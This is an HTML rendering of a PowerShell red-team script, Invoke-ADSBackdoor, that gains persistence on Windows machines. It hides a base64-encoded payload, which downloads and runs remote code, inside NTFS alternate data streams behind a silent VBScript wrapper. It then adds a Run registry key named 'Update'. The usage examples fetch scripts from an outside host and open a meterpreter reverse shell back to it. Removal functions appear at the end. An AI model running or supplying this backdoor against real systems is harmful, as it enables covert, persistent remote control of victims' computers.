<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Invoke-ADSBackdoor.ps1</title>
</head><body>function Invoke-ADSBackdoor{<br/>
&lt;#<br/>
.SYNOPSIS<br/>
Powershell Script that will use Alternate Data Streams to achieve persistence<br/>
Author: Matt Nelson (@enigma0x3)<br/>
<br/>
.DESCRIPTION<br/>
This script will obtain persistence on a Windows 7+ machine under both Standard and Administrative accounts by <br/>
using two Alternate Data Streams. The first Alternate Data stream stores the payloadand the second Alternate Data Stream <br/>
stores some VBScript that acts as a wrapper in order to hide the DOS prompt when invoking the data stream containing the <br/>
payload. When passing the arguments, you have to include the function and any parameters required by your payload. <br/>
The arguments must also be in quotation marks.<br/>
<br/>
<br/>
.EXAMPLE<br/>
PS C:\Users\test\Desktop&gt; Invoke-ADSBackdoor -URL http://192.168.1.138/payload.ps1 -Arguments &quot;hack&quot;<br/>
<br/>
This will use the function &quot;Hack&quot; in payload.ps1 for persistence<br/>
<br/>
.EXAMPLE<br/>
<br/>
PS C:\Users\test\Desktop&gt; Invoke-ADSBackdoor -URL http://192.168.1.138/Invoke-Shellcode.ps1 -Arguments &quot;Invoke-Shellcode<br/>
-Lhost 192.168.1.138 -LPort 2222 -Payload windows/meterpreter/reverse_https -Force&quot;<br/>
<br/>
This will use the function Invoke-Shellcode in Invoke-Shellcode.ps1 to shovel meterpreter back to 192.168.1.138 on port <br/>
2222 over HTTPS. <br/>
<br/>
PowerSploit Function: Invoke-Shellcode<br/>
Author: Matthew Graeber (@mattifestation)<br/>
License: BSD 3-Clause<br/>
Required Dependencies: None<br/>
Optional Dependencies: None<br/>
<br/>
.EXAMPLE<br/>
meterpreter&gt;shell<br/>
Process 4780 created.<br/>
Channel 1 created.<br/>
Microsoft Windows [Version 6.1.7601]<br/>
Copyright (c) 2009 Microsoft Corporation. All rights reserved.<br/>
C:\&gt;powershell.exe -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.138/Invoke-ADSBackdoor.ps1'); Invoke-ADSBackdoor <br/>
-URL http://192.168.1.138/Invoke-Shellcode.ps1 <br/>
-Arguments 'Invoke-Shellcode -LHost 192.168.1.138 -LPort 666 -Payload windows/meterpreter/reverse_https -Force'&quot;<br/>
<br/>
This will execute the persistence script using Invoke-Shellcode as the payload from a meterpreter session<br/>
<br/>
#&gt;<br/>
<br/>
  [CmdletBinding()]<br/>
  Param(<br/>
   [Parameter(Mandatory=$True)]<br/>
   [string]$URL,<br/>
    <br/>
   [Parameter(Mandatory=$False)]<br/>
   [String]$Arguments<br/>
  )<br/>
<br/>
  $TextfileName = [System.IO.Path]::GetRandomFileName() + &quot;.txt&quot;<br/>
  $textFile = $TextfileName -split '\.',([regex]::matches($TextfileName,&quot;\.&quot;).count) -join ''<br/>
  $VBSfileName = [System.IO.Path]::GetRandomFileName() + &quot;.vbs&quot;<br/>
  $vbsFile = $VBSFileName -split '\.',([regex]::matches($VBSFileName,&quot;\.&quot;).count) -join ''<br/>
<br/>
  #Store Payload<br/>
  $payloadParameters = &quot;IEX ((New-Object Net.WebClient).DownloadString('$URL')); $Arguments&quot;<br/>
  $encodedPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payloadParameters))<br/>
  $payload = &quot;powershell.exe -ep Bypass -noexit -enc $encodedPayload&quot;<br/>
<br/>
  #Store VBS Wrapper<br/>
  $vbstext1 = &quot;Dim objShell&quot;<br/>
  $vbstext2 = &quot;Set objShell = WScript.CreateObject(&quot;&quot;WScript.Shell&quot;&quot;)&quot;<br/>
  $vbstext3 = &quot;command = &quot;&quot;cmd /C for /f &quot;&quot;&quot;&quot;delims=,&quot;&quot;&quot;&quot; %i in ($env:UserProfile\AppData:$textFile) do %i&quot;&quot;&quot;<br/>
  $vbstext4 = &quot;objShell.Run command, 0&quot;<br/>
  $vbstext5 = &quot;Set objShell = Nothing&quot;<br/>
  $vbText = $vbstext1 + &quot;:&quot; + $vbstext2 + &quot;:&quot; + $vbstext3 + &quot;:&quot; + $vbstext4 + &quot;:&quot; + $vbstext5<br/>
<br/>
  #Create Alternate Data Streams for Payload and Wrapper<br/>
  $CreatePayloadADS = {cmd /C &quot;echo $payload &gt; $env:USERPROFILE\AppData:$textFile&quot;}<br/>
  $CreateWrapperADS = {cmd /C &quot;echo $vbtext &gt; $env:USERPROFILE\AppData:$vbsFile&quot;}<br/>
  Invoke-Command -ScriptBlock $CreatePayloadADS<br/>
  &quot;Payload stored in $env:USERPROFILE\AppData:$textFile&quot;<br/>
  Invoke-Command -ScriptBlock $CreateWrapperADS<br/>
  &quot;Wrapper stored in $env:USERPROFILE\AppData:$vbsFile&quot;<br/>
<br/>
  #Persist in Registry<br/>
  new-itemproperty -Path &quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\Run&quot; -Name Update -PropertyType String -Value &quot;wscript.exe $env:USERPROFILE\AppData:$vbsFile&quot; -Force<br/>
  &quot;Process Complete. Persistent key is located at HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\Update&quot;<br/>
}<br/>
<br/>
<br/>
function Remove-ADS {<br/>
&lt;#<br/>
.SYNOPSIS<br/>
Removes an alterate data stream from a specified location.<br/>
P/Invoke code adapted from PowerSploit's Mayhem.psm1 module.<br/>
Author: @harmj0y, @mattifestation<br/>
License: BSD 3-Clause<br/>
<br/>
.LINK<br/>
https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1<br/>
<br/>
#&gt;<br/>
  [CmdletBinding()] Param(<br/>
    [Parameter(Mandatory=$True)]<br/>
    [string]$ADSPath<br/>
  )<br/>
<br/>
  #region define P/Invoke types dynamically<br/>
  #  stolen from PowerSploit https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1<br/>
  $DynAssembly = New-Object System.Reflection.AssemblyName('Win32')<br/>
  $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)<br/>
  $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32', $False)<br/>
<br/>
  $TypeBuilder = $ModuleBuilder.DefineType('Win32.Kernel32', 'Public, Class')<br/>
  $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))<br/>
  $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')<br/>
  $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor,<br/>
    @('kernel32.dll'),<br/>
    [Reflection.FieldInfo[]]@($SetLastError),<br/>
    @($True))<br/>
<br/>
  # Define [Win32.Kernel32]::DeleteFile<br/>
  $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('DeleteFile',<br/>
    'kernel32.dll',<br/>
    ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),<br/>
    [Reflection.CallingConventions]::Standard,<br/>
    [Bool],<br/>
    [Type[]]@([String]),<br/>
    [Runtime.InteropServices.CallingConvention]::Winapi,<br/>
    [Runtime.InteropServices.CharSet]::Ansi)<br/>
  $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)<br/>
  <br/>
  $Kernel32 = $TypeBuilder.CreateType()<br/>
  <br/>
  $Result = $Kernel32::DeleteFile($ADSPath)<br/>
<br/>
  if ($Result){<br/>
    Write-Verbose &quot;Alternate Data Stream at $ADSPath successfully removed.&quot;<br/>
  }<br/>
  else{<br/>
    Write-Verbose &quot;Alternate Data Stream at $ADSPath removal failure!&quot;<br/>
  }<br/>
<br/>
  $Result<br/>
}<br/>
<br/>
<br/>
function Remove-ADSBackdoor {<br/>
&lt;#<br/>
.SYNOPSIS<br/>
Removes the backdoor installed by Invoke-ADSBackdoor.<br/>
<br/>
.DESCRIPTION<br/>
This function will remove the persistence installed by Invoke-ADSBackdoor by parsing<br/>
the run registry run key, removing the alternate data stream files, and then<br/>
removing the registry key.<br/>
#&gt;<br/>
<br/>
  # get the VBS trigger command/file location from the registry<br/>
  $trigger = (gp HKCU:\Software\Microsoft\Windows\CurrentVersion\Run Update).Update<br/>
  $vbsFile = $trigger.split(&quot; &quot;)[1]<br/>
  $getWrapperADS = {cmd /C &quot;more &lt; $vbsFile&quot;}<br/>
  $wrapper = Invoke-Command -ScriptBlock $getWrapperADS<br/>
<br/>
  if ($wrapper -match 'i in \((.+?)\)')<br/>
  {<br/>
    # extract out the payload .txt file location<br/>
    $textFile = $matches[1]<br/>
    if($( Remove-ADS $textFile)){<br/>
      &quot;Successfully removed payload file $textFile&quot;<br/>
    }<br/>
    else{<br/>
      &quot;[!] Error in removing payload file $textFile&quot;<br/>
    }<br/>
    <br/>
  }<br/>
  else{<br/>
    &quot;[!] Error: couldn't extract PowerShell script location from VBS wrapper $vbsFile&quot;<br/>
  }<br/>
<br/>
  if($(Remove-ADS $vbsFile)){<br/>
    &quot;Successfully removed wrapper file $vbsFile&quot;<br/>
  }<br/>
  else{<br/>
    &quot;[!] Error in removing payload file $textFile&quot;<br/>
  }<br/>
<br/>
  # remove the registry run key<br/>
  Remove-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update;<br/>
  &quot;Successfully removed HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ 'Update' key&quot;<br/>
}<br/>
</body></html>